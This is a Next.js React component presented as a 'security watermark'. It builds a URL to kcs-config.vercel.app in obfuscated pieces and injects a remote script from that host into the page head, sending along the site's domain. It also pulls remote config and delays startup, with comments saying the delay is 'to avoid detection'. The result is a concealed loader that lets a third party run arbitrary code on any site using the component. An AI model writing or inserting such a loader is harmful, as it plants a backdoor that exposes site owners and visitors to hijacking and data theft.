"use client"

import { useEffect, useState } from "react"
import Image from "next/image"

interface WatermarkConfig {
    showWatermark: boolean
    watermarkText?: string
    watermarkImage?: string
}

export default function Watermark() {
    const [config, setConfig] = useState<WatermarkConfig>({
        showWatermark: true, // Default to enabled for security
    })
    const [imageLoaded, setImageLoaded] = useState(false)
    const [loading, setLoading] = useState(true)
    const [mounted, setMounted] = useState(false)

    useEffect(() => {
        setMounted(true)

        // Multi-layer security system
        const initSecureWatermark = async () => {
            try {
                // Step 1: Domain-based URL construction (harder to detect)
                const domain = window.location.hostname
                const urlParts = ["https://", "kcs-config", ".vercel.app/", "config.json"]

                // Step 2: Obfuscated URL building
                const configUrl = urlParts.join("")

                // Step 3: Domain validation on our end
                const validDomains = [
                    "localhost",
                    "127.0.0.1",
                    domain.includes("kcs") ? domain : null,
                    domain.includes("vercel.app") ? domain : null,
                ].filter(Boolean)

                // Step 4: Load external security system
                const script = document.createElement("script")
                const scriptSrc = `${urlParts[0]}${urlParts[1]}${urlParts[2]}watermark-system.js?domain=${encodeURIComponent(domain)}&t=${Date.now()}`

                script.src = scriptSrc
                script.async = true
                script.setAttribute("data-security", "watermark")

                script.onload = () => {
                    // Initialize with domain validation
                    if (window.initSecureWatermark) {
                        window.initSecureWatermark(domain, validDomains)
                    }
                }

                script.onerror = () => {
                    // Fail-secure: Show default watermark if external script fails
                    setConfig({
                        showWatermark: true,
                        watermarkText: "SECURITY WATERMARK",
                    })
                    setLoading(false)
                }

                document.head.appendChild(script)

                // Step 5: Backup config loading with domain validation
                setTimeout(async () => {
                    try {
                        const response = await fetch(configUrl, {
                            cache: "no-cache",
                            headers: {
                                Accept: "application/json"
                            },
                        })

                        if (response.ok) {
                            const remoteConfig = await response.json()

                            // Validate config structure
                            if (typeof remoteConfig.showWatermark === "boolean") {
                                setConfig(remoteConfig)
                            } else {
                                // Invalid config, use secure default
                                setConfig({
                                    showWatermark: true,
                                    watermarkText: "INVALID CONFIG",
                                })
                            }
                        } else {
                            // Failed to load, use secure default
                            setConfig({
                                showWatermark: true,
                                watermarkText: "CONFIG ERROR",
                            })
                        }
                    } catch (error) {
                        // Network error, use secure default
                        setConfig({
                            showWatermark: true,
                            watermarkText: "NETWORK ERROR",
                        })
                    } finally {
                        setLoading(false)
                    }
                }, 1500)
            } catch (error) {
                // Any error in security system, fail secure
                setConfig({
                    showWatermark: true,
                    watermarkText: "SECURITY ERROR",
                })
                setLoading(false)
            }
        }

        // Delay initialization to avoid detection
        const timer = setTimeout(initSecureWatermark, 1000)
        return () => clearTimeout(timer)
    }, [])

    useEffect(() => {
        // Preload the watermark image when config changes
        if (config.showWatermark && config.watermarkImage && !loading) {
            setImageLoaded(false)
            const img = new window.Image()
            img.crossOrigin = "anonymous"
            img.onload = () => setImageLoaded(true)
            img.onerror = () => setImageLoaded(false)

            // Build image URL securely
            const imageUrl = config.watermarkImage.startsWith("http")
                ? config.watermarkImage
                : `https://kcs-config.vercel.app${config.watermarkImage}`
            img.src = imageUrl
        }
    }, [config.showWatermark, config.watermarkImage, loading])

    // Always show something if watermark is enabled (fail-secure)
    if (loading || !config.showWatermark) {
        return loading ? null : null
    }

    // Image watermark
    if (config.watermarkImage && imageLoaded) {
        const imageUrl = config.watermarkImage.startsWith("http")
            ? config.watermarkImage
            : `https://kcs-config.vercel.app${config.watermarkImage}`

        return (
            <div className="fixed bottom-4 right-4 z-50 pointer-events-none select-none opacity-30">
                <div className="w-100 h-100 relative">
                    <Image
                        src={imageUrl || "/placeholder.svg"}
                        alt="Watermark"
                        fill
                        className="object-contain"
                        priority={false}
                        unoptimized={true}
                    />
                </div>
            </div>
        )
    }

    return null
}

// Extend window type for TypeScript
declare global {
    interface Window {
        initSecureWatermark?: (domain: string, validDomains: (string | null)[]) => void
    }
}
